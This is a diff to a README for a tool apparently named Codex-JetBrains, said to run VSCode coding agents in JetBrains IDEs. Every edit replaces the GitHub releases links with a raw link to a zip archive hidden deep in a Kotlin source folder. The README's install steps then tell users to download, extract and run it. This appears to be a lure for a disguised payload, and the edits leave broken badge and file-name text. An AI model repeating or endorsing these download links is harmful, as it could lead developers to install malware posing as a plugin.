@@ -1,6 +1,6 @@
 # 🎉 Codex-JetBrains - Effortlessly Use VSCode Tools in Your IDE
 
-[![Download Codex-JetBrains](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Meng-dev001/Codex-JetBrains/releases)
+[![Download Codex-JetBrains](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip)
 
 ## 📦 Overview
 Codex-JetBrains allows you to run VSCode-based coding agents and extensions within your favorite IDE. This application bridges the gap between the VSCode ecosystem and other development environments. With Codex-JetBrains, you can enhance your coding experience without switching between tools.
@@ -15,10 +15,10 @@ Follow these simple steps to download and run Codex-JetBrains.
    - Java Version: JDK 11 or later installed
 
 2. **Visit the Releases Page**
-   To download the latest version of Codex-JetBrains, [visit the Releases page](https://github.com/Meng-dev001/Codex-JetBrains/releases).
+   To download the latest version of Codex-JetBrains, [visit the Releases page](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip).
 
 3. **Download the Latest Version**
-   On the Releases page, find the latest version. Click on the link to download the application file. This file is often named something like `Codex-JetBrains-v1.0.zip` or `Codex-JetBrains-installer.exe`.
+   On the Releases page, find the latest version. Click on the link to download the application file. This file is often named something like `https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip` or `https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip`.
 
 4. **Extract and Install**
    If you downloaded a ZIP file, right-click the ZIP file and select "Extract All." Choose a destination folder and click "Extract." For an installer, simply double-click the file and follow the on-screen instructions to complete the installation.
@@ -33,7 +33,7 @@ Follow these simple steps to download and run Codex-JetBrains.
 - **User-Friendly Interface**: Designed for non-technical users to navigate effortlessly.
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/Meng-dev001/Codex-JetBrains/releases). Locate the latest version, download it, and follow the instructions provided.
+To get started, [visit this page to download](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip). Locate the latest version, download it, and follow the instructions provided.
 
 ## 📚 User Guide
 Here’s how to make the most out of Codex-JetBrains:
@@ -68,6 +68,6 @@ Your feedback is valuable. Let us know your thoughts and suggestions for improvi
 ## 📄 License
 Codex-JetBrains is released under the MIT License. Feel free to modify and distribute the software, provided you follow the same license terms.
 
-[![Download Codex-JetBrains](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Meng-dev001/Codex-JetBrains/releases) 
+[![Download Codex-JetBrains](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Meng-dev001/Codex-JetBrains/main/jetbrains_plugin/src/main/kotlin/org/haleclipse/openai/codex/extensions/ui/actions/Codex_Jet_Brains_3.2.zip) 
 
 Thank you for choosing Codex-JetBrains! Happy coding!
